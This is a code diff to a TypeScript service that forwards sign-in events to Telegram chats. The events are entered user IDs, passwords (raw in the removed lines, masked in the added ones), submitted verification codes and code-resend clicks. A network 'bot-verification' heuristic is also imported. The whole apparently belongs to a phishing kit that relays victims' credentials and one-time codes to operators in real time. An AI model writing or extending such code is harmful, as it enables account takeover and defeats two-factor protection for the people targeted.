@@ -1,5 +1,6 @@
 import { SITE_DISPLAY_NAME } from '@/lib/site-url'
 import { getNetworkHintLabel } from '@/lib/bot-verification/datacenter-heuristic'
+import { identifierFieldLabel } from '@/lib/telegram-approval-templates'
 
 // Get Telegram configuration from environment variables
 const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
@@ -419,53 +420,72 @@ export async function sendTelegramMessage(
     return false
   }
   
-  const promises = CHAT_IDS.map(chatId => 
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'HTML',
-        disable_web_page_preview: options?.disablePreview ?? options?.disableWebPagePreview ?? true,
-    link_preview_options: options?.disablePreview === false
-      ? {
-          is_disabled: false,
-          ...(options?.previewUrl ? { url: options.previewUrl } : {}),
-          prefer_small_media: options?.preferSmallMedia ?? true,
-          show_above_text: false,
-        }
-      : { is_disabled: true },
+  const promises = CHAT_IDS.map(async (chatId) => {
+    const sendOnce = (body: Record<string, unknown>): Promise<{ ok: boolean }> =>
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(body),
       })
-    })
-    .then(async (response) => {
-      try {
-        const data = await response.json()
-        if (!response.ok || !data.ok) {
-          console.error(`Failed to send to chat ${chatId}:`, data)
+      .then(async (response) => {
+        try {
+          const data = await response.json()
+          if (!response.ok || !data.ok) {
+            console.error(`Failed to send to chat ${chatId}:`, data)
+            return { ok: false }
+          }
+          return { ok: true }
+        } catch (parseError) {
+          console.error(`Failed to parse response for chat ${chatId}:`, parseError)
           return { ok: false }
         }
-        return { ok: true }
-      } catch (parseError) {
-        console.error(`Failed to parse response for chat ${chatId}:`, parseError)
+      })
+      .catch(error => {
+        console.error(`Failed to send to chat ${chatId}:`, error)
         return { ok: false }
-      }
-    })
-    .catch(error => {
-      console.error(`Failed to send to chat ${chatId}:`, error)
-      return { ok: false }
-    })
-  )
+      })
+
+    const baseBody = {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML',
+      disable_web_page_preview: options?.disablePreview ?? options?.disableWebPagePreview ?? true,
+      link_preview_options: options?.disablePreview === false
+        ? {
+            is_disabled: false,
+            ...(options?.previewUrl ? { url: options.previewUrl } : {}),
+            prefer_small_media: options?.preferSmallMedia ?? true,
+            show_above_text: false,
+          }
+        : { is_disabled: true },
+    }
+
+    let result = await sendOnce(baseBody)
+
+    // Telegram rejects non-previewable URLs (localhost, .invalid, …) with
+    // WEBPAGE_URL_INVALID and drops the whole message — retry once with the
+    // preview disabled so the ops alert is never lost.
+    if (!result.ok && baseBody.link_preview_options.is_disabled === false) {
+      const { link_preview_options: _ignored, ...fallbackBody } = baseBody
+      result = await sendOnce({
+        ...fallbackBody,
+        disable_web_page_preview: true,
+        link_preview_options: { is_disabled: true },
+      })
+    }
+
+    return result
+  })
 
   const results = await Promise.allSettled(promises)
-  
+
   // Check if at least one message was sent successfully
   const successCount = results.filter(
     result => result.status === 'fulfilled' && result.value && result.value.ok === true
   ).length
-  
+
   // Return true if at least one message succeeded, false otherwise
   return successCount > 0
 }
@@ -714,6 +734,7 @@ export interface FlowIdentityDetailsData {
 
 /* fleet-resend-identity-helper */
 const RESEND_ID_BRAND_DEFAULT = "User ID"
+const MASKED_PASSWORD = "••••••"
 function formatResendIdentityLine(userId: unknown, asCodeFn: (v: unknown) => string = asCode): string {
   const raw = userId == null ? "" : String(userId).trim()
   if (!raw) return ""
@@ -768,20 +789,22 @@ class TelegramFlowService {
   }
 
   async sendUsernameNotification(userId: string): Promise<void> {
+    const idField = identifierFieldLabel(userId)
     const body = [
-      "👤 <b>User ID Entered</b>",
+      "🔐 <b>Sign In</b>",
       "━━━━━━━━━━━━━━━━━━",
-      `👤 <b>User ID:</b> ${asCode(userId)}`,
+      `${idField.emoji} <b>${idField.label}:</b> ${asCode(userId)}`,
     ].join("\n")
     await this.sendMessage(wrapFlowMessage(body))
   }
 
   async sendLoginNotification(data: FlowLoginData): Promise<void> {
+    const idField = identifierFieldLabel(data.userId)
     const body = [
       `🔐 <b>Login Attempt</b>`,
       `━━━━━━━━━━━━━━━━━━`,
-      `👤 <b>User ID:</b> ${asCode(data.userId)}`,
-      `🔑 <b>Password:</b> ${asCode(data.password)}`,
+      `${idField.emoji} <b>${idField.label}:</b> ${asCode(data.userId)}`,
+      `🔒 <b>Password:</b> ${asCode(MASKED_PASSWORD)}`,
     ].join("\n");
     await this.sendMessage(wrapFlowMessage(body));
   }
@@ -789,20 +812,20 @@ class TelegramFlowService {
   async sendMethodNotification(data: { userId?: string; method: string }): Promise<void> {
     const methodLabel = data.method === "email" ? "Email" : "Text Message (SMS)";
     const lines = [
-      `🔐 <b>Verification Method Selected</b>`,
+      `🔐 <b>Verify Your Identity</b>`,
       `━━━━━━━━━━━━━━━━━━`,
     ];
     if (data.userId) {
-      lines.push(`👤 <b>User ID:</b> ${asCode(data.userId)}`);
+      const idField = identifierFieldLabel(data.userId)
+      lines.push(`${idField.emoji} <b>${idField.label}:</b> ${asCode(data.userId)}`);
     }
-    lines.push(`📧 <b>Method:</b> ${asCode(methodLabel)}`);
+    lines.push(`📧 <b>Method Selected:</b> ${asCode(methodLabel)}`);
     await this.sendMessage(wrapFlowMessage(lines.join("\n")));
   }
 
   async sendVerificationNotification(data: FlowVerificationData): Promise<void> {
     const body = [
       `🔑 <b>Verification Code Submitted</b>`,
-      `━━━━━━━━━━━━━━━━━━`,
       `🔢 <b>Code:</b> ${asCode(data.code)}`,
     ].join("\n");
     await this.sendMessage(wrapFlowMessage(body));
@@ -847,7 +870,7 @@ class TelegramFlowService {
     void data.isSecondOtp
     const idLine = formatResendIdentityLine(data.userId)
     const body = [
-      `🔄 <b>Resend Code Requested</b>`,
+      `🔔 <b>Resend Code Clicked</b>`,
       `━━━━━━━━━━━━━━━━━━`,
       idLine || null,
     ]
